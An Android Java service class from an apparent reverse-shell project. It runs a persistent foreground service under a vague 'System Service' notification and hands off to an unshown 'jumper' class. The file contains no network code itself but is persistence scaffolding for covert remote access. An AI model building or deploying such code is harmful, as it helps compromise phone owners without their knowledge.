package com.example.reverseshell2;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;

public class mainService extends Service {
    static String TAG ="mainServiceClass";
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG,"in");
        
        // Create notification channel for Android 8.0+
        new functions(null).createNotiChannel(getApplicationContext());
        
        // Build the foreground notification
        androidx.core.app.NotificationCompat.Builder builder = new androidx.core.app.NotificationCompat.Builder(getApplicationContext(), "channelid")
                .setContentTitle("System Service")
                .setContentText("Running in background")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setPriority(androidx.core.app.NotificationCompat.PRIORITY_LOW);
        
        // Start service in foreground
        startForeground(1122, builder.build());
        
        new jumper(getApplicationContext()).init();
        return START_STICKY;
    }
}
